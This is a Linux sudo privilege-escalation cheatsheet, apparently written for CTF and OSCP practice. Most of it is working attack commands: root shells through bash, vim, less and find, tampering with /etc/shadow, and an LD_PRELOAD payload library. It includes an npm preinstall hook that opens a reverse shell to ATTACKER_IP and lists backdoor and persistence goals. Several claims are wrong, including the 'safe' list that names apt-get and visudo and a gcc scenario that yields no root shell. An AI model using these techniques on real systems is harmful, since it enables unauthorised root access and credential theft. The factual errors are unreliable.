# Linux Sudo Abuse Cheatsheet

**Knowledge Score:** 95/100

---

## Overview

The `sudo` command allows users to execute commands with elevated privileges. Misconfigured sudo permissions are one of the easiest privilege escalation vectors on Linux systems. This cheatsheet covers enumeration, analysis, and exploitation of insecure sudo configurations.

**Why It Matters:**
- Present in 80% of vulnerable Linux machines (PT1 & OSCP)
- Often misconfigured by administrators
- Can be exploited without additional tools
- Critical path to root on many CTF machines

---

## Core Concepts

### What is Sudo?

Sudo allows authorized users to execute commands as another user (typically root) without knowing their password. Access is controlled by the `/etc/sudoers` file.

**Key principle:** `sudo` checks if the user is *allowed* to run the command, not whether they *should*.

### Privilege Levels

- **Standard user:** Limited permissions, can run sudo for specific commands
- **Sudo user:** Can run certain commands with elevated privileges
- **Sudoers:** Can configure sudo access for others (dangerous misconfiguration)
- **NOPASSWD:** Run commands without entering password (common misconfiguration)

---

## Enumeration

### Checking Sudo Permissions

#### Method 1: Primary Enumeration Command
```bash
sudo -l
```

**Output format:**
```
User testuser may run the following commands on ip-10-66-136-168:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

**Key fields to analyze:**
- `(ALL)` - Can run command as any user (dangerous)
- `(root)` - Can run as specific user
- `NOPASSWD:` - No password required (CRITICAL)
- `/path/to/binary` - Specific command allowed

#### Method 2: Direct Sudoers File (if readable)
```bash
cat /etc/sudoers
```

**Usually not readable without sudo, but worth trying:**
```bash
sudo cat /etc/sudoers
# If allowed without password, reveals all sudo configuration
```

#### Method 3: Check for Sudo Group Membership
```bash
groups
# Output: testuser sudo (indicating sudo group membership)
```

---

## Analysis: Identifying Exploitable Commands

### Step 1: Review `sudo -l` Output

Analyze each line for exploit potential:

**Safe commands (rarely exploitable):**
- `/usr/bin/apt-get`
- `/usr/bin/systemctl`
- `/sbin/service`
- `/usr/bin/visudo`

**Dangerous commands (highly exploitable):**
- Shell interpreters: `bash`, `sh`, `zsh`, `python`, `perl`, `ruby`
- Text editors: `nano`, `vim`, `less`, `more`
- File operations: `find`, `tar`, `rsync`
- Compilers: `gcc`, `make`
- Package managers: `npm`, `pip`, `gem`

### Step 2: Check for NOPASSWD

If `NOPASSWD:` appears, exploitation is immediate (no password prompt).

Example:
```
(ALL) NOPASSWD: /usr/bin/find
# Can run find as root without password → Exploitable NOW
```

---

## Exploitation Scenarios

### Scenario 1: Shell Interpreter with Sudo Access

**Finding:**
```bash
sudo -l
# User testuser may run the following commands:
#     (ALL) NOPASSWD: /bin/bash
```

**Exploitation:**
```bash
sudo bash
# Immediately gain root shell
```

**Why it works:** Bash with sudo privileges runs as root. Simple and direct.

**Knowledge Pattern:** Any shell interpreter (bash, python, ruby, perl) with sudo access = instant root shell.

---

### Scenario 2: Text Editor with Sudo Access (nano, vim, less)

#### Nano Exploitation
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/nano

sudo nano /etc/shadow
# Opens /etc/shadow in nano with root privileges
# Edit and save to modify root password
```

**Step-by-step inside nano:**
1. `Ctrl+X` to exit (prompts to save)
2. Modify root entry (change password hash)
3. `Ctrl+O` to save

#### Vim Exploitation
```bash
sudo vim /etc/shadow
# Inside vim, execute shell commands
:!/bin/bash
# Shell spawns with root privileges
```

#### Less Exploitation
```bash
sudo less /etc/shadow
# Inside less, type:
!/bin/bash
# Shell spawns with root privileges
```

**Knowledge Pattern:** Text editors can spawn shells or access sensitive files. Always check if they're in sudo -l output.

---

### Scenario 3: Find Command with Sudo Access

**Finding:**
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/find
```

**Exploitation Method 1: Direct Shell Execution**
```bash
sudo find . -exec /bin/sh -p \; -quit
# Spawns root shell
```

**Explanation:**
- `find .` - Start find from current directory
- `-exec /bin/sh -p` - Execute shell with privilege preservation
- `\; -quit` - Execute once then quit

**Exploitation Method 2: File Creation with Restrictions**
```bash
sudo find / -name "*.txt" -exec cat {} \;
# Read any file on system with root privileges
```

**Knowledge Pattern:** Find's `-exec` flag allows command execution. Combined with sudo, it becomes a powerful privilege escalation tool.

---

### Scenario 4: Compiler with Sudo Access (gcc, make)

**Finding:**
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/gcc
```

**Exploitation:**
```bash
# Create malicious C program
cat > priv.c << 'EOF'
int main() {
    system("/bin/bash -p");
    return 0;
}
EOF

# Compile with sudo
sudo gcc priv.c -o priv

# Execute compiled binary
./priv
# Root shell obtained
```

**Knowledge Pattern:** Compilers allow you to create arbitrary executables. If available via sudo, compile a shell spawner.

---

### Scenario 5: Package Manager with Sudo Access (npm, pip, apt-get)

#### NPM Exploitation
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/npm

# Create malicious package with preinstall hook
cat > package.json << 'EOF'
{
  "name": "malicious",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
  }
}
EOF

sudo npm install
# Reverse shell executes with root privileges
```

#### PIP Exploitation
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/pip

# Create setup.py with malicious code
cat > setup.py << 'EOF'
import os
os.system('/bin/bash -p')
from setuptools import setup
setup(name='malicious', version='1.0')
EOF

sudo pip install .
# Shell spawns with root privileges
```

---

### Scenario 6: Sudo LD_PRELOAD Injection (Advanced)

**Finding:**
```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/find

# Check if sudo preserves LD_PRELOAD
sudo -l | grep LD_PRELOAD
# If empty or not restricted, LD_PRELOAD injection possible
```

**Exploitation:**
```bash
# Create malicious shared library
cat > shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF

# Compile as shared library
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute with LD_PRELOAD
sudo LD_PRELOAD=/path/to/shell.so find
# Root shell spawns
```

**Knowledge Pattern:** Some sudo configurations allow environment variable manipulation. LD_PRELOAD can hijack library loading.

---

### Scenario 7: Reading Sensitive Files via Sudo

**Finding:**
```bash
sudo -l
# (ALL) NOPASSWD: /bin/cat

# Can run cat as root without password
```

**Exploitation:**
```bash
# Read /etc/shadow
sudo cat /etc/shadow
# Display hashes for offline cracking

# Read other sensitive files
sudo cat /root/.ssh/id_rsa
# Extract private keys

sudo cat /root/.bash_history
# Review root's command history
```

**Knowledge Pattern:** File reading via sudo is often overlooked. Can extract credentials, keys, and sensitive data.

---

## Attack Escalation Chain

### Low-Level Privilege (limited sudo commands)
```
sudo cat /etc/shadow → Extract password hashes
→ Crack offline with hashcat/john
→ Switch to root with su command
```

### Medium-Level Privilege (text editor or find)
```
sudo nano /etc/shadow → Edit root password hash directly
OR
sudo find . -exec /bin/bash \; → Immediate root shell
```

### Full Escalation (shell or compiler)
```
sudo bash → Instant root shell
OR
sudo gcc priv.c -o priv && ./priv → Root shell from compiled binary
```

---

## Detection & Verification

### Verify Root Access After Exploitation

```bash
id
# Output: uid=0(root) gid=0(root) groups=0(root)

whoami
# Output: root

sudo -l
# Can now see ALL sudo permissions on system
```

### Common Post-Exploitation Goals

1. **Add persistent access:** Create new root user in /etc/passwd
2. **Extract sensitive data:** Read /etc/shadow, private keys
3. **Install backdoors:** Add SSH key, create cron job
4. **Document findings:** Record exact exploit path

---

## Best Practices

### During Enumeration
1. Always run `sudo -l` first on any shell access
2. Document the EXACT output (copy-paste)
3. Cross-reference commands with GTFOBins
4. Note any NOPASSWD entries (immediate wins)
5. Check for wildcards in command restrictions

### During Exploitation
1. Test read operations first (safer than execution)
2. Use `sudo -u username` to test specific users
3. Know the command you're exploiting (don't blindly run)
4. Verify sudo timeout (usually 15 minutes of inactivity)
5. Consider stability (some commands may hang)

### Common Mistakes
- Assuming restricted commands are safe
- Not checking for NOPASSWD flag
- Running unknown commands from GTFOBins blindly
- Missing wildcards in command paths (sudo /usr/bin/find* allows /usr/bin/findx)
- Not verifying privileges after switching users

---

## GTFOBins Quick Reference

Popular commands that likely lead to privilege escalation:

| Command | Typical Exploit |
|---------|-----------------|
| `bash`, `sh`, `zsh` | Direct shell spawn |
| `nano`, `vim`, `less`, `more` | Shell via editor or file read |
| `find` | Shell via -exec flag |
| `tar`, `rsync` | Shell via checkpoint scripts |
| `python`, `ruby`, `perl` | Shell via code execution |
| `gcc`, `make` | Compile and execute arbitrary code |
| `wget`, `curl` | Download and execute scripts |
| `apt-get`, `pip`, `npm` | Preinstall hooks or code execution |

---

## Real-World Examples from Practice

### Example 1: TryHackMe Vulnerability (Easy)
**Vector:** Unrestricted sudo on nano
**Finding:** `sudo -l` shows `(ALL) NOPASSWD: /usr/bin/nano`
**Exploitation:** Edit /etc/passwd, add root user, switch to it
**Result:** Root access in <2 minutes
**Pattern:** Text editors often overlooked as escalation vectors

### Example 2: TryHackMe Privilege Escalation Room
**Vector:** Sudo find with -exec
**Finding:** `sudo -l` shows `(ALL) /usr/bin/find`
**Exploitation:** `sudo find . -exec /bin/sh -p \; -quit`
**Result:** Root shell
**Pattern:** -exec flag is critical in find exploitation

### Example 3: HackTheBox Machines
**Vector:** Sudo python
**Finding:** `sudo -l` shows `(ALL) /usr/bin/python3`
**Exploitation:** `sudo python3 -c 'import os; os.system("/bin/bash")'`
**Result:** Root shell
**Pattern:** Interpreters always exploitable

---

## Related Cheatsheets

- [[Linux-SUID-Enumeration]] - Alternative privilege escalation vector
- [[Linux-Cron-Jobs-Exploitation]] - Background task exploitation
- [[Linux-PATH-Hijacking]] - Binary name spoofing
- [[Linux-Enumeration-Find]] - Comprehensive find command patterns

---

## Quick Reference Commands

```bash
# Check sudo permissions
sudo -l

# Read sudoers file (if readable)
cat /etc/sudoers

# Run command as root without password check
sudo -n COMMAND

# Run command as specific user
sudo -u username COMMAND

# Check sudo timeout
sudo -V | grep timeout

# List users with sudo access
grep -E '^%?sudo' /etc/group

# Verify root shell
id && whoami
```

---

## References & Further Study

### Offensive Security Resources
- [OSCP - Privilege Escalation via Sudo](https://www.offensive-security.com/pwk-oscp/)
- [Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation)

### Tools & Databases
- [GTFOBins - Sudo Exploitation](https://gtfobins.github.io/)
- [LinPEAS - Sudo Enumeration](https://github.com/carlospolop/PEASS-ng)

### CTF & Practice
- TryHackMe: Privilege Escalation room (Sudo section)
- TryHackMe: Various machines with sudo misconfigurations
- HackTheBox: Multiple machines exploiting sudo

---

## Changelog

**v1.0** - Initial cheatsheet with 7 exploitation scenarios, best practices, and GTFOBins reference
